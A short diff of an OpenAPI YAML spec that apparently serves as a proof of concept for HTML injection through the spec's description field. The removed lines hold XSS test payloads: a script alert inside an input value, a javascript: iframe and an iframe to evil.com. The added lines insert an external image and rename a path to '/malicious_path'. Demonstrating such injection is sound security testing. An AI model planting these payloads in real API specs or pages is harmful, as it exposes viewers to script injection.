@@ -5,16 +5,12 @@ info:
   description: '<div>
     <div class="heading">
         <h1>HTML Injection :</h1> (PoC d0ug)
-    </div>
-    <div>
-    <input type="text" name="email" value="<script>alert(9)</script>">
-    <iframe src="javascript:alert(1)"></iframe>
-    <iframe src="https://evil.com"></iframe>
+        <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*e_0eHJ87WTEgaXBm9qYlFA.jpeg">
     </div>
   </div>'
 paths:
-  /:
+  /malicious_path:
     post:
       responses:
         "200":
-          description: Login successful
+          description: HTML Injection by: d0ug
